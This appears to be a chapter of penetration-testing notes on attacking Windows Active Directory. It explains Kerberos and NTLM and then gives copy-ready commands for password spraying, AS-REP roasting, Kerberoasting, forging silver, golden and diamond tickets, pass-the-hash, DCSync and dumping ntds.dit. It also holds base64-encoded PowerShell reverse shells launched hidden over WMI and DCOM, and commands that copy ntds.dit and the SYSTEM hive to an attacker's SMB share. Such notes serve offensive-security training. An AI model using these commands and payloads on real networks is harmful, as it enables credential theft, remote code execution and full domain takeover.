Microsoft **Kerberos** (based on MIT's Kerberos version 5) has been used as the default authentication mechanism since Windows Server 2003. It is a stateless ticket-based authentication system, where clients get "tickets" (cryptographically secured data containing access permissions) from the _Key Distribution Center (KDC)_. Application servers verify the client's ticket before granting access to AD objects. The Domain Controller performs the role of KDC in Active Directory. The KDC consists of two services, the *Authentication Server (AS)* and the *Ticket Granting Service (TGS)*. Each is used in a separate stage of the Kerberos authentication process.

There are three stages/phases Kerberos authentication:
1. Client obtains a *Ticket Granting Ticket (TGT)* from the KDC's AS. This happens at initial logon and when the TGT is about to expire.
2. Client uses its TGT to request a *service ticket* (permission to access a specific service) from the KDC's TGS.
3. Client uses the service ticket to access the desired service on an application server.

The detailed steps to obtain a TGT from the AS are:
1. Client sends _Authentication Server Request (AS-REQ)_ to KDC's AS. AS-REQ contains username and an encrypted timestamp (to prevent replay attacks). The timestamp is encrypted with the NT hash (i.e. unsalted MD4 hash) of user's password.
2. KDC's AS decrypts timestamp using user's password hash stored in the **`ntds.dit`** file. If decrypted timestamp matches current time (and isn't duplicate), the KDC sends an _Authentication Server Reply (AS-REP)_ to the client. AS-REP contains a _session key_ and a _Ticket Granting Ticket (TGT)_
	- session key has HMAC encrypted with user's NT hash for their use later.
	- TGT contains information about user, domain, IP of client, timestamp, and session key.
	- To avoid tampering, the TGT is encrypted by a secret key (NTLM hash of the *`krbtgt`* account) known only to the KDC and cannot be decrypted by the client.
	- TGT valid for 10 hours by default, with automatic renewal

When the client wants to access a service in the domain (e.g. share drive, email), the client must first request a service ticket from the KDC. The steps are:
1. Client sends _Ticket Granting Service Request (TGS-REQ)_ to KDC's TGS. TGS-REQ contains the name of requested service/resource (known as the *Service Principal Name (SPN)* in AD), the TGT (still encrypted with `krbtgt`'s hash), and encrypted username and timestamp (both encrypted with session key).
2. KDC performs multiple actions/checks to verify the TGS-REQ:
	1. Checks requested resource exists
	2. Decrypts TGT, extracts session key
	3. Decrypts username and timestamp with session key
	4. Checks valid timestamp (matches current time, not duplicate)
	5. Checks username of TGT and TGS-REQ match
	6. Checks IP of client matches IP from TGS
	- NOTE: the KDC does NOT check that the user is allowed access to the service. This function is performed by the SPN itself. This opens the door for a Kerberoasting attack.
3. Assuming checks pass, KDC sends client _Ticket Granting Server Reply (TGS-REP)_, containing name of service with access granted, session key for use between client and service, and a _service ticket_ containing the username and group memberships along with the newly-created session key.
	- The service name and service-session key are encrypted with the TGT-session key for client to use.
	- The service ticket is encrypted using the password hash of the SPN registered for the service in question.

Finally, the client can request access to the service from the application server:
1. Client sends server _Application Request (AP-REQ)_, which includes service ticket and the encrypted username and timestamp (encrypted with the service-session key)
2. Application server performs several actions/checks to verify the AP-REQ:
	1. Decrypts the service ticket using its service account password hash
	2. Extracts username and session key from service ticket
	3. Uses session key to decrypt username and timestamp
	4. Checks valid timestamp
	5. Checks username of service ticket matches decrypted one from AP-REQ
3. Assuming checks pass, the client is granted access to the service

**NTLM** (NTLMv2) authentication is a challenge-and-response system. NTLM is a fast hashing algorithm for authentication, so it can easily be cracked. These are the steps for NTLM authentication:
1. Client calculates the cryptographic NTLM hash from the user's password
2. Client sends username to (application) server
3. Server sends nonce to client
4. Client encrypts nonce with NTLM hash and sends result to server
5. Server forwards encrypted nonce, nonce and username to DC
6. DC encrypts nonce with stored NTLM hash of user and checks against supplied encrypted nonce
7. If two encrypted nonces match, DC sends authentication verified message to server

NTLM authentication is used in 3 cases in Active Directory:
- when a client authenticates to a server by IP address (instead of by hostname)
- if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server
- third-party applications may choose to use NTLM authentication instead of Kerberos

In modern versions of Windows, the NTLM hashes/Kerberos tokens are cached in the Local Security Authority Subsystem Service (LSASS) memory space, so we can steal them using Mimikatz. To steal tickets, **make sure you interact with the target service first** (e.g. list directory of share)!

Microsoft provides the AD role _Active Directory Certificate Services (AD CS)_ to implement a PKI, which exchanges digital certificates between authenticated users and trusted resources. If a server is installed as a _Certification Authority (CA)_ it can issue and revoke digital certificates (and much more). This can be abused to defeat active directory authentication that relies on PKI, including Smart Cards.


### 5.2.1 Change Active Directory Credentials

If you have `GenericAll` (or `Self`) permissions over any user in Active Directory, you can change that user's password. This is one way to privesc or move laterally in an Active Directory domain.

To change the password of a user on a Windows AD domain:

```powershell
# simple way
net user /domain USERNAME PASSWORD

# powershell way
Set-ADAccountPassword -Identity someuser -OldPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd" -Force) -NewPassword (ConvertTo-SecureString -AsPlainText "qwert@12345" -Force)
```



### 5.2.2 Password Spraying in Active Directory

```powershell
# check account policy's password lockout threshold
net accounts
```

See the simple [`Spray-Passwords.ps1`](tools/win/Spray-Passwords.ps1) script, which is based on an expansion of this idea:

```powershell
$pdc=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner;
$dn=([adsi]'').distinguishedName
$p=("LDAP://"+$pdc.Name+"/"+$dn);
$d=New-Object System.DirectoryServices.DirectoryEntry($p,"USERNAME","PASSWORD")
```

Use the script like so:

```powershell
.\Spray-Passwords.ps1 -Admin -Pass "PASSWORD"
```

Alternatively, use **CrackMapExec**, which has bonus of showing whether user is Admin on target by adding `Pwn3d!` to output. NOTE: CME does not throttle requests, so watch out for account lockout.

```sh
# check list of usernames against single host
crackmapexec smb -u users.txt -p 'PASSWORD' --continue-on-success -d DOMAIN VICTIM_IP

# (assuming you know password) check which machines user(s) can access and has admin on.
# For admin, look for '(Pwn3d!)'
crackmapexec smb -u USERNAME -p 'PASSWORD' --continue-on-success -d DOMAIN CIDR_OR_RANGE
```

Another option is **Kerbrute**:

```sh
# fetch kerbrute
wget -O kerbrute32.exe https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_386.exe
wget -O kerbrute64.ese https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_amd64.exe
wget -O kerbrute https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute

# on linux
./kerbrute passwordspray -d DOMAIN ./usernames.txt 'PASSWORD' --dc DOMAIN_IP

# on windows
.\kerbrute64.exe passwordspray -d DOMAIN .\usernames.txt "PASSWORD"
# if you receive a network error, make sure that the encoding of usernames.txt is ANSI.
# You can use Notepad's Save As functionality to change the encoding.
```


### 5.2.3 AS-REP Roasting

AS-REP Roasting is an attack to retrieve a user's password hash that can be brute-forced offline.

Normally when requesting a TGT, a client must prove its identity by encrypting the timestamp with it's hashed password in the AS-REQ. This is known as *Kerberos Preauthentication*. However, some services require turning preauthentication off (by enabling the _Do not require Kerberos preauthentication (i.e. DONT_REQ_PREAUTH)_ option) in order to function. This means that they (or any attacker) can request a TGT without submitting an encrypted timestamp, and the server will respond with a properly-encrypted TGT. Because the session key contains an HMAC encrypted with the user's hash, we can brute force this offline. Under the hood, the attack also weakens the crypto by requesting RC4 as the only allowable cipher for the HMAC (vs. the default of AES256-CTS).

Enumerating for users that are AS-REP Roastable:

```powershell
# Windows: using PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname

# Microsoft standard way of looking for users with 
# "Do not require Kerberos Preauthentication" option set (hex 0x400000 = 4194304)
# requires ActiveDirectory module to be loaded
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | fl

# Kali: using impacket (specify user info for authentication to DC)
impacket-GetNPUsers -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD
```

Collecting hashes using AS-REP Roast attack:

```powershell
# Windows: use Rubeus.exe (can use /format:hashcat interchangably)
.\Rubeus.exe asreproast /format:john /outfile:asreproast.hash
# push to stdout instead of file
.\Rubeus.exe asreproast /nowrap

# Kali: using crackmapexec, automatically finds all AS-REP Roastable users & grabs hashes
crackmapexec ldap VICTIM -u USERNAME -p PASSWORD --asreproast asreproast.hash

# Kali: use impacket (specify user info for authentication to DC)
impacket-GetNPUsers -request -outputfile asreproast.hash -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD
```

Cracking the AS-REP roast hashes:

```sh
# using John-the-Ripper (auto-detects krb5asrep format)
john --wordlist=/usr/share/wordlists/rockyou.txt asreproast.hash

# using hashcat
hashcat -m 18200 --force -r /usr/share/hashcat/rules/best64.rule asreproast.hash /usr/share/wordlists/rockyou.txt
```

If you have write permissions for another user account (e.g. `GenericAll`), then, instead of changing their password, you could momentarily set their account to disable Preauth, allowing you to AS-REP roast their account. Here's how:

```powershell
# using Microsoft ActiveDirectory Module
get-aduser -identity $USERNAME | Set-ADAccountControl -doesnotrequirepreauth $true

# using AD Provider
$flag = (Get-ItemProperty -Path "AD:\$DISTINGUISHED_NAME" -Name useraccountcontrol).useraccountcontrol -bor 0x400000
Set-ItemProperty -Path "AD:\$DISTINGUISHED_NAME" -Name useraccountcontrol -Value "$flag" -Confirm:$false

# using ADSI accelerator (legacy, may not work for cloud-based servers)
$user = [adsi]"LDAP://$DISTINGUISHED_NAME"
$flag = $user.userAccountControl.value -bor 0x400000
$user.userAccountControl = $flag
$user.SetInfo()
```


### 5.2.4 Kerberoasting

Kerberoasting is an attack to retrieve the password hash of a Service Principal Name (SPN) that can be brute-forced offline.

When requesting the service ticket from the KDC, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN. These checks are performed only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller. The service ticket's HMAC is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt the HMAC using brute force or guessing, we can use this information to crack the cleartext password of the service account. This is known as Kerberoasting. It is very similar to AS-REP Roasting, except it is attacking SPNs' hashes instead of users'.

Obtaining the SPN Hashes:

```powershell
# Windows: using PowerView.ps1
Invoke-Kerberoast | fl

# Windows: using Rubeus
# '/tgtdeleg' tries to downgrade encryption to RC4
.\Rubeus.exe kerberoast /tgtdeleg /outfile:kerberoast.hash

# Kali: use crackmapexec, auto-finds all kerberoastable users & grabs hashes
crackmapexec ldap VICTIM_IP -u harry -p pass --kerberoasting kerberoast.hash

# Kali: use impacket
impacket-GetUserSPNs -request -outputfile kerberoast.hash -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD
```

Cracking the kerberoast hashes:

```sh
# using John-the-Ripper (auto-detects krb5tgs format)
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.hash

# using hashcat
hashcat -m 13100 --force -r /usr/share/hashcat/rules/best64.rule kerberoast.hash /usr/share/wordlists/rockyou.txt
```

If the SPN runs in the context of a computer account, a managed service account, or a group-managed service account, the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. The same is true for the `krbtgt` user account which acts as service account for the KDC.

If you have write permissions for another user account (e.g. `GenericAll`), then, instead of changing their password, you could momentarily add/register an SPN to their account, allowing you to kerberoast them.

Once you have the SPN password, you can use it to forge a Silver Ticket. You must first convert it to its NTLM hash, which is simply the MD4 hash of the password.

```python
import hashlib
h = hashlib.new("md4", "SPN_PASSWORD".encode("utf-16le")).hexdigest()
print(h)
```



### 5.2.5 Silver Ticket

A Silver Ticket is a forged service ticket that an attacker uses to gain access to a service.

Privileged Account Certificate (PAC) validation is an optional verification process between the SPN application and the DC. If this is enabled, the user authenticating to the service and its privileges are validated by the DC. Fortunately for this attack technique, service applications rarely perform PAC validation.

That means that an attacker with the SPN password (see [Kerberoasting](#5.2.4%20Kerberoasting)) or its NTLM hash can forge a service ticket for any user with whatever group memberships and permissions the attacker desires, and the SPN will commonly blindly trust those permissions rather than verify them with the DC.

We need to collect the following three pieces of information to create a silver ticket:

- SPN password hash (can get with mimikatz when SPN has session on your computer)
- Domain SID (extract from user SID)
- Target SPN

More info: [HackTricks - Silver Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket)

Getting prerequisite info:

```powershell
# use mimikatz to get SPN NTLM hash
mimikatz.exe
> privilege::debug
> sekurlsa::logonpasswords

# extract the Domain SID from the user SID (everything but RID, numbers after last dash)
whoami /user

# list SPNs from specific host
setspn -l HOSTNAME
# example for IIS server: HTTP/web04.corp.com:80
```

Create silver ticket (you can use any valid username):

```powershell
# in mimikatz:
# /ptt - pass the ticket; auto-injects it into memory
kerberos::golden /sid:S-1-5-... /domain:DOMAIN /ptt /target:SERVER_FQDN /service:http /rc4:NTLM_HASH /user:ADMIN_USER

# TODO: figure out how to do this with Rubeus.exe
# Rubeus lets you ask for tickets for all services at once:
# /altservice:host,rpcss,http,wsman,cifs,ldap,krbtgt,winrm
.\Rubeus.exe silver /rc4:NTHASH /user:USERNAME /service:SPN /ldap /ptt [/altservice:host,rpcss,http,wsman,cifs,ldap,krbtgt,winrm] [/nofullpacsig] [outfile:FILENAME]

# Kali: get SIDs with crackmapexec
crackmapexec ldap DC_FQDN -u USERNAME -p PASSWORD -k --get-sid

# Kali: use impacket
# Service is something like http, cifs, host, ldap, etc. (cifs lets you access files)
impacket-lookupsid DOMAIN/USERNAME:PASSWORD@VICTIM
impacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-.... -domain DOMAIN -spn SERVICE/VICTIM_FQDN USERNAME
export KRB5CCNAME=$(pwd)/USERNAME.ccache 
impacket-psexec DOMAIN/USERNAME@VICTIM -k -no-pass
```

Confirm ticket is loaded in memory on Windows host:

```powershell
# list kerberos tickets available to user
klist

# make web request with silver ticket
iwr -UseDefaultCredentials http://VICTIM
```

Before 11 October 2022, it was possible to forge Silver tickets for nonexistent users. That's no longer the case, due to a security patch that adds the `PAC_REQUESTOR` field to the Privilege Attribute Certificate (PAC) structure. The field contains the username, and it is required to be validated by the DC (when patch is enforced).

## 5.3 Lateral Movement in Active Directory

Pass-the-Hash (PtH) only works for servers using NTLM authentication (not Kerberos only). Authentication is performed using an SMB connection, so port 445 must be open, the Windows File and Printer Sharing feature to be enabled (it is by default), and the `ADMIN$` share to be available. It also requires local administrator rights. Most tools that are built to abuse PtH can be leveraged to start a Windows service (for example, cmd.exe or an instance of PowerShell) and communicate with it using Named Pipes. This is done using the Service Control Manager API.



### 5.3.1 PsExec on Active Directory

PsExec allows you to run remote processes as a child of a Windows service process, meaning you get SYSTEM privileges.

Prerequisites: The user that authenticates to the target machine needs to be part of the *Administrators* local group. In addition, the _ADMIN$_ share must be available and File and Printer Sharing must be turned on (this is default).

PsExec is part of the Sysinternals suite, and performs the following tasks:
- Writes `psexesvc.exe` into the `C:\Windows` directory
- Creates and spawns a service on the remote host
- Runs the requested program/command as a child process of `psexesvc.exe`

Using Sysinternals PsExec for remote interactive session (from windows host):

```powershell
# interactive shell using sysinternals version of psexec
./PsExec64.exe -accepteula -i  \\VICTIM -u DOMAIN\ADMINUSER -p PASSWORD cmd
```

Using `impacket-psexec` from Kali, pass-the-hash is possible:

```sh
# spawns interactive shell as SYSTEM
impacket-psexec -hashes :NTHASH ADMINUSER@VICTIM_IP

# with password authentication:
impacket-psexec 'ADMINUSER:PASSWORD@VICTIM_IP'
```


### 5.3.2 WMI and WinRM on Active Directory

WMI and WinRM both require plaintext credentials when executed from Windows (hashes are sufficient from Linux with impacket), and they both allow running commands as an administrator on a remote machine.

*Windows Management Instrumentation (WMI)* is capable of creating processes via the `Create` method from the `Win32_Process` class. It communicates through *Remote Procedure Calls (RPC)* over port 135 for remote access. In order to create a process on the remote target via WMI, we need (plaintext credentials of a member of the *Administrators* local group. The nice thing about WMI for lateral movement is that UAC remote access restrictions don't apply for domain users on domain-joined machines, so we can leverage full privileges.

Abusing WMI for lateral movement (from Windows):

```powershell
# create remote process with legacy tool: wmic
wmic /node:VICTIM_IP /user:LOCALADMIN /password:PASSWORD process call create "calc.exe"

# create remote process with PowerShell's WMI
# variable declaration
$username = 'LOCALADMIN';
$password = 'PASSWORD';
$victim = 'VICTIM'
$lhost = 'LISTEN_IP'
$lport = 443
$revshell = '$client=New-Object System.Net.Sockets.TCPClient("'+$lhost+'",'+$lport+');$stream = $client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String );$sendback2=$sendback+"PS "+(pwd).Path+">";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()';
$b64cmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($revshell));
$command = 'powershell -ep bypass -nop -w hidden -enc '+$b64cmd;
# requires PSCredential object to hold creds
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
# then create Common Information Model (CIM) session object with DCOM protocol
# (i.e. WMI session)
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName $victim -Credential $credential -SessionOption $options
# Invoke Create method of Win32_Process
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$command};
```

Using WMI from Kali, which allows pass-the-hash!

```sh
# spawns remote shell as admin user with pass-the-hash
impacket-wmiexec -hashes :NTHASH ADMINUSER@VICTIM_IP

# using password authentication
impacket-wmiexec 'ADMINUSER:PASSWORD@VICTIM_IP'
```

*Windows Remote Management (WinRM)* is an alternative to WMI for remote administration, which we can also abuse. The benefit is that we get the output of commands we run on the attacker's Windows machine, and we can even get an interactive PowerShell session directly through WinRM.

WinRM is the Microsoft version of the WS-Management protocol, and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5985 for encrypted HTTPS traffic and port 5986 for plain HTTP. For WinRM to work, you need plaintext credentials of a domain user who is a member of the Administrators or Remote Management Users group on the target host.

Abusing WinRM for lateral movement (from Windows host):

```powershell
# legacy Windows Remote Shell (winrs) tool:
winrs -r:VICTIM -u:ADMINUSER -p:PASSWORD  "cmd /c hostname & whoami"
# stdout of cmd is printed here!

# using PowerShell
# variable declaration
$victim = 'VICTIM';
$username = 'LOCALADMIN';
$password = 'PASSWORD';
# starts same as WMI, creating PSCredential object
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
# create WinRM sesson
New-PSSession -ComputerName $victim -Credential $credential
# interactive session
Enter-PSSession 1
# run specific remote commands
Invoke-Command -ComputerName $victim -Credential $Cred -ScriptBlock { cmd.exe }
```

Abusing WinRM from Kali (allows pass the hash):

```sh
# interactive shell as admin user using PtH
evil-winrm -i VICTIM_IP -u ADMINUSER -H NTHASH

# or with password auth
evil-winrm -i VICTIM_IP -u ADMINUSER -p PASSWORD
```


### 5.3.3 Overpass-the-Hash

Overpass-the-hash is when you use an NTLM (or AES256) hash to obtain a Kerberos TGT in an environment where NTLM authentication is not allowed. Once you have the impersonated-user's TGT, you can use all the Windows tools/services that rely on Kerberos in the context of that user (e.g. PsExec)

**NOTE**: Because Kerberos relies on domain names, you must use those for any commands instead of IP addresses (set your `/etc/hosts` file).

```powershell
# using mimikatz
privilege::debug
# grab hash:
sekurlsa::logonpasswords
# perform overpass-the-hash, starting powershell window as user
# alternatively, kick off reverse shell
sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTHASH /run:powershell
# in new powershell session, interact to get/cache TGT (and TGS):
net use \\VICTIM
# inspect that you have TGT now
klist
# ready to use this session with creds (see psexec cmd below)


# using Rubeus
# be sure to use format "corp.com" for DOMAIN
.\Rubeus.exe asktgt /domain:DOMAIN /user:USER /rc4:NTHASH /ptt


# now you can use PsExec in context of stolen user
.\PsExec.exe -accepteula \\VICTIM cmd
# note, the spawned shell will be under stolen user, not SYSTEM

# or maybe just list shares
net view \\VICTIM
dir \\VICTIM\SHARE
```

On Kali, use impacket:

```sh
# be sure to use format "corp.com" for DOMAIN
impacket-getTGT -dc-ip DC_IP DOMAIN/USERNAME -hashes :NTHASH # or -aesKey AESKEY
export KRB5CCNAME=$(pwd)/USERNAME.ccache
impacket-psexec -k -no-pass DOMAIN/USER@VICTIM_FQDN
# this spawned shell will (still) be SYSTEM
# when you can't resolve domain IPs, add -dc-ip DC_IP -target-ip VICTIM_IP

# if you get the error:
[-] SMB SessionError: STATUS_MORE_PROCESSING_REQUIRED({Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.)
# check that the target IP is correct/matches the victim hostname

# USE THIS
# you can also do overpass-the-hash directly with one command:
impacket-psexec -k -hashes :NTLM DOMAIN/USER@VICTIM_FQDN
```


### 5.3.4 Pass-the-Ticket

In Pass-the-Ticket, you steal someone else's kerberos ticket from memory and use it to access resources you wouldn't be able to. Stealing a TGS ticket more versatile than a TGT because you can use it on other machines, not just the one you stole it from. This attack is similar to Overpass-the-hash, except you're skipping over the AS-REQ, straight to the part where you have a ticket in hand.

Acquiring tickets with mimikatz:

```powershell
# in mimikatz shell:
privilege::debug
sekurlsa::tickets /export
kerberos::ptt FILENAME.kirbi

# in cmd shell:
# list tickets (pick which ones you want to copy to other machine)
dir *.kirbi

# check you have the ticket in memory
klist

# then use the permissions granted by the ticket (e.g. list files in share)
ls \\VICTIM\SHARE
```

Acquiring tickets with Rubeus:

```powershell
# from elevated cmd prompt
# list all tickets in memory
.\Rubeus.exe triage

# dump desired tickets (base64 encoded .kirbi printed to stdout)
.\Rubeus.exe dump /nowrap [/luid:LOGINID] [/user:USER] [/service:krbtgt]

# load the ticket into session (copy and paste base64 kirbi data from previous)
.\Rubeus.exe ptt /ticket:BASE64_KIRBI
```

Using saved tickets from Kali:

```sh
# if you have base64 ticket from Rubeus, convert to .kirbi first
echo -n "BASE64_KIRBI" | base64 -d > USERNAME.kirbi

# convert .kirbi to .ccache
impacket-ticketConverter USERNAME.kirbi USERNAME.ccache

# export path to .ccache to use with other tools
export KRB5CCNAME=$(pwd)/USERNAME.ccache

# use with crackmapexec, impacket-psexec/wmiexec/smbexec
# make sure you set /etc/hosts to reslove FQDN for crackmapexec
crackmapexec smb --use-kcache VICTIM_FQDN
impacket-psexec -k -no-pass VICTIM_FQDN
```


### 5.3.5 DCOM

Detailed first writeup by [cybereason](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)

Microsoft's *Component Object Model (COM)* allows software interaction between processes, and _Distributed Component Object Model (DCOM)_ extends COM to allow process interaction on remote hosts.

Both COM and DCOM are very old technologies dating back to the very first editions of Windows. Interaction with DCOM is performed over RPC on TCP port 135 and local **administrator access is required** to call the DCOM Service Control Manager, which is essentially an API.

The following DCOM lateral movement technique is based on the *Microsoft Management Console (MMC)* COM application that is employed for scripted automation of Windows systems. The MMC Application Class allows the creation of Application Objects, which expose the `ExecuteShellCommand` method under the `Document.ActiveView` property. This method allows execution of any shell command as long as the authenticated user is authorized, which is the default for local administrators.

Leveraging DCOM to get a reverse shell on a remote machine:

```powershell
# variable declaration
$victim = 'VICTIM' # hostname or IP
$lhost = 'LISTEN_IP'
$lport = 443
$revshell = '$client=New-Object System.Net.Sockets.TCPClient("'+$lhost+'",'+$lport+');$stream = $client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String );$sendback2=$sendback+"PS "+(pwd).Path+">";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()';
$b64cmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($revshell));
$command = 'powershell -ep bypass -nop -w hidden -enc '+$b64cmd;
# create the DCOM MMC object for the remote machine
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1",$victim))
# execute shell command through DCOM object
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,$command,"7")
# ExecuteShellCommand accepts 4 parameters:
# Command, Directory, Parameters, and WindowState (7 is hidden).
```


## 5.4 Active Directory Persistence

### 5.4.1 Domain Controller Synchronization (DCSync)

DCSync lets you remotely dump the hashes from a domain controller's `ntds.dit` file.

When multiple DCs are in use for redundancy, AD uses the Directory Replication Service (DRS) Remote Protocol to replicate (synchronize) these redundant DCs (e.g. using `IDL_DRSGetNCChanges` API). The DC receiving the sync request does not check that the request came from a known DC, only that the SID making the request has appropriate privileges.

To launch such a replication, a user needs to have the *Replicating Directory Changes*, *Replicating Directory Changes All*, and *Replicating Directory Changes in Filtered Set* rights. By default, members of the *Domain Admins*, *Enterprise Admins*, and *Administrators* groups have these rights assigned. If we get access to any user account with these rights, we can impersonate a DC and perform the DCsync attack. The end result is the target DC will send the attacker copies of any data he requests.

Performing dcsync attack:

```powershell
# From inside mimikatz shell
# grab all hashes from DC
lsadump::dcsync
# grab hashes of specific user
lsadump::dcsync /user:corp\Administrator

# Kali: use impacket
# full dump of hashes
# you can use '-hashes LMHASH:NTHASH' for auth instead of password (or omit LMHASH)
impacket-secretsdump -just-dc -outputfile dcsync DOMAIN/ADMINUSER:PASSWORD@DC_IP
# grab specific user's hashes
impacket-secretsdump -just-dc-user -outputfile dcsync USER DOMAIN/ADMINUSER:PASSWORD@DC_IP
```

Crack dumped NTLM hashes:

```sh
❯ hashcat -m 1000 -w3 --force -r /usr/share/hashcat/rules/best64.rule --user dcsync.ntds /usr/share/wordlists/rockyou.txt
```


### 5.4.2 Volume Shadow Copy

Domain Admins can abuse shadow copies to obtain a copy of the `ntds.dit` file (the Active Directory database, containing all user credentials).

A Shadow Copy, also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows creation of snapshots of files or entire volumes. Shadow copies are managed by the binary `vshadow.exe`, part of the Windows SDK. They can also be created using WMI.

```powershell
# from elevated terminal session:

# create volume shadow copy of C: drive
# -nw : no writers (to speed up creation)
# -p : store copy on disk
vshadow.exe -nw -p  C:
# pay attention to Shadow copy device name
# line under * SNAPSHOT ID = {UUID}
#    - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

# create SMB session with hacker machine
net use \\ATTACKER_IP herpderp /user:derp

# copy the ntds.dit file over to attacker machine (must do in cmd, not PS)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit \\ATTACKER_IP\share\ntds.dit.bak

# save copy of SYSTEM registry hive onto attacker machine
# this contains the encryption keys for the ntds.dit file
reg.exe save hklm\system \\ATTACKER_IP\share\system.hiv

# on Kali, use secretsdump to extract hashes
impacket-secretsdump -ntds ntds.dit.bak -system system.hiv -outputfile ntds-dump LOCAL
```

Alternative ways to create shadow copies, plus ways of working with them:

```powershell
# create shadow copy with wmic:
wmic shadowcopy call create volume=c:\

# create with PowerShell
([WMICLASS]"root\cimv2:win32_shadowcopy").create("C:\","ClientAccessible")

# list all volume shadow copies for C: drive
vssadmin list shadows /for=C:

# list using Powershell (shows date created)
Get-CimInstance Win32_ShadowCopy | select Name,Caption,Description,ServiceMachine,InstallDate,ID,DeviceObject

# if you want to browse the files in the shadow copy, mount it:
# Note the trailing slash at the end of the shadow copy device name's path!
mklink /D C:\users\Public\stuff SHADOWCOPYDEVNAME\
```

`Secretsdump` also supports the VSS method directly:

```sh
# perform VSS technique all in one go using secretsdump (-use-vss flag)
impacket-secretsdump -use-vss -just-dc -outputfile ntds-dump DOMAIN/ADMINUSER:PASSWORD@DC_IP
```




### 5.4.3 Golden Ticket

A Golden Ticket is a forged TGT that grants the user full Domain Admin rights across the entire domain. It requires having access to the `krbtgt` account's password hash, which means we've either compromised a Domain Admin account or the Domain Controller machine directly. The `krbtgt` account's hash is what the KDC uses for signing (encrypting) TGTs in the AS-REP. It's special because it's never changed automatically.

Taking advantage of a Golden Ticket is a form of overpass-the-hash, using the `krbtgt` hash to forge a TGT directly instead of submitting an AS-REQ with a regular user's hash to get the DC to grant you a TGT.

Before starting, make sure you have the `krbtgt` hash. You can get this many ways, including running `lsadump::lsa` in mimikatz on the DC, performing a dcsync attack, etc. Additionally, you must use an existing username (as of July 2022), and not a phony one.

```powershell
# extract the Domain SID from the user's SID
# (remove the RID and keep the rest. RID is last set of numbers in SID)
whoami /user

# in mimikatz shell
privilege::debug
# remove all existing tickets, so they don't conflict with the one you're forging
kerberos::purge
# forge golden ticket, load into memory with /ptt
# note use of '/krbtgt:' to pass NTHASH instead of '/rc4:' - difference b/w silver
# use '/aes256:' for AES256 kerberos hash
kerberos::golden /user:USER /domain:DOMAIN /sid:S-1-5-21-.... /krbtgt:NTHASH /ptt
# start cmd shell with new ticket in its context
misc::cmd cmd

# alternatively, use Rubeus (/aes256: if desired)
.\Rubeus.exe golden /ptt /rc4:HASH /user:USERNAME /ldap [outfile:FILENAME]
# here's loading a saved ticket:
.\Rubeus.exe ptt /ticket:ticket.kirbi

# list tickets in memory, make sure its there
klist

# now use overpass-the-hash technique (full domain name required)
.\PsExec.exe \\dc1 cmd.exe
```

You can forge a Golden Ticket on Kali:

```sh
# look up domain SID
impacket-lookupsid DOMAIN/USER:PASSWORD@VICTIM

# use -aesKey for AES256 hashes
impacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-.... -domain DOMAIN USERNAME
export KRB5CCNAME=$(pwd)/USERNAME.ccache
impacket-psexec -k -no-pass DOMAIN/USERNAME@VICTIM
# be sure to use FQDNs. Pass -dc-ip and -target-ip if necessary to resolve FQDNs
```

Even better (more OPSEC savvy) is a *Diamond Ticket*, where you modify the fields of a legitimate TGT by decrypting it with the `krbtgt` hash, modify it as needed (e.g. add Domain Admin group membership) and re-encrypt it.

```powershell
# Get user RID
whoami /user

.\Rubeus.exe diamond /ptt /tgtdeleg /ticketuser:USERNAME /ticketuserid:USER_RID /groups:512 /krbkey:AES256_HASH
# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
